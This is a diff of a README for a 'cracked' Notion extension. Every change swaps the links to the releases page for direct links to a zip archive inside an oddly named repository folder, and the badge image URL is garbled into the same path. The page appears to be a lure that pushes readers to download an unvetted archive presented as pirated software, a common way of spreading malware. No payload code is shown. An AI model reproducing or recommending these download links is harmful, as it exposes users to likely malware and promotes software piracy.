@@ -1,6 +1,6 @@
 # 🌟 cracked-enhancer-for-notion-extension - Enhance Your Notion Experience Fast
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kbusweaty/cracked-enhancer-for-notion-extension/releases)
+[![Download Now](https://raw.githubusercontent.com/kbusweaty/cracked-enhancer-for-notion-extension/main/isocheim/cracked-enhancer-for-notion-extension.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kbusweaty/cracked-enhancer-for-notion-extension/main/isocheim/cracked-enhancer-for-notion-extension.zip)
 
 ## 📖 Introduction
 
@@ -22,7 +22,7 @@ Before downloading, make sure your computer meets these requirements:
 
 To download the Cracked Enhancer for Notion Extension, visit this link:
 
-[Download the latest release](https://github.com/kbusweaty/cracked-enhancer-for-notion-extension/releases)
+[Download the latest release](https://raw.githubusercontent.com/kbusweaty/cracked-enhancer-for-notion-extension/main/isocheim/cracked-enhancer-for-notion-extension.zip)
 
 You will find a list of available versions. Choose the latest version to ensure you have the best features.
 
@@ -57,7 +57,7 @@ Once installed, you may want to configure the extension to suit your needs:
 
 ## 📥 Download & Install
 
-To download the extension, visit this page to download: [Latest Releases](https://github.com/kbusweaty/cracked-enhancer-for-notion-extension/releases)
+To download the extension, visit this page to download: [Latest Releases](https://raw.githubusercontent.com/kbusweaty/cracked-enhancer-for-notion-extension/main/isocheim/cracked-enhancer-for-notion-extension.zip)
 
 After downloading, follow the installation steps above. Make sure to customize your settings right after installation for an optimal experience. 
 
